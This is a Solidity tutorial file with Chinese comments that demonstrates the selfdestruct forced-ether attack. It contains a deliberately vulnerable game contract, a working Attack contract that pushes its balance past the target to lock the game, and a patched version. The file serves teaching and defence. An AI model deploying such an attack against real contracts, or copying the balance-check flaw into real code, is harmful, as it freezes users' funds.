// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// 游戏合约：每个人可以质押一个ETH，到第七个ETH的时候游戏结束，最后一个人可以取走所有的钱
// 攻击合约：利用自毁函数，直接给合约打钱到超过7eth,那么剩余的人也无法玩游戏，也没有胜利者；
// 这种攻击对黑客没有好处，只会影响项目方

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
        //修改方法，此处不使用this.balance，直接用balance从0开始加
        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
    function getBalance() external view returns(uint){
        return address(this).balance;
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // 利用自毁函数给合约转账
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }

    function getBalance() external view returns(uint){
        return address(this).balance;
    }
}


//这里是修改后的正确合约，可以预防自毁攻击

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
